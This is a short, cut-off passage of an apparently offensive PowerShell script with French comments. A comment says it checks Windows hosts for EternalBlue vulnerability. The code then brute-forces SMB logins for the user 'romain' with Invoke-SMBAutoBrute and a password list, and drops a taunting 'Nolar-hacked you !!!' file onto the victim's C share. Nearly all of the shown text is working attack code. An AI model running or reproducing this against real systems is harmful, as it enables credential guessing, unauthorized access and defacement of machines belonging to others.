...
#-------------------------------------------------------------------
# On check si la version du windows est vulnerable à eternalblue
#-------------------------------------------------------------------
                ...
                Else {
                    "---------------------------------------------------------"
                    Write-Host "Trying to Bruteforce .... $ip" -ForegroundColor Red
                    "---------------------------------------------------------"

#-------------------------------------------------------------------
# On essaye de brutefoce la session
#-------------------------------------------------------------------

                    .\Bruteforce.ps1
                    Invoke-SMBAutoBrute -PasswordList .\password.txt -UserList "romain" LockoutThreshold 50 -Verbose
                    $transfered = New-Item -Path "\\$ip\c" -ItemType file -Name Trolololo.jpg -Value "Nolar-hacked you !!!"
